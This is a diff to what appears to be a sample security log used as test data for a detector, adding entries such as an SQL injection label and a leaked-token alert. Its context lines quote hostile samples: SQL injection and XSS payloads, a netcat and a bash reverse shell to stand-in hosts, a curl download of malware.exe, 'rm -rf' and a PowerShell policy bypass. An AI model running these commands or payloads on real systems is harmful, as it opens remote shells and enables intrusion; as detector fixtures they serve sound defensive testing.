@@ -19,7 +19,7 @@ WARN Login attempt username=admin' OR 1=1 --
 WARN SQL attack detected: UNION SELECT password FROM users
 WARN IMG exploit: <img src=x onerror=alert(1)>
 WARN BODY exploit: <body onload=alert('xss')>
-WARN Weak password detected: password123
+WARN Weak_password detected: password123
 WARN Admin login using admin123
 WARN Admin endpoint accessed: /admin/dashboard
 WARN Debug endpoint exposed: /debug/config
@@ -33,6 +33,7 @@ WARN nc -e /bin/sh attacker.com 4444
 WARN Shell execution detected: os.system("rm -rf")
 WARN User attempt access to admin_panel
 WARN Unauthorized access to admin_panel
+WARN admin_access attempt to /admin/users
 ERROR XSS payload: javascript:alert('owned')
 ERROR User account using qwerty password
 ERROR Authorization header leaked: Authorization: Bearer eyJHbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature123
@@ -41,8 +42,10 @@ ERROR Possible login bypass attempt: ' OR 1=1 --
 ERROR Unsafe deserialization: pickle.loads(user_data)
 ERROR SQL injection attempt detected: ' OR 1=1 --
 ERROR XSS payload: <script>alert(1)</script>
+ERROR sql_injection_payload detected: ' OR 1=1 --
 CRITICAL Dangerous eval detected: eval(user_input)
 ALERT powershell.exe -ExecutionPolicy Bypass
 ALERT curl http://evil-site.com/malware.exe
 ALERT bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
-
+ALERT github_token found in config
+ALERT powershell execution detection
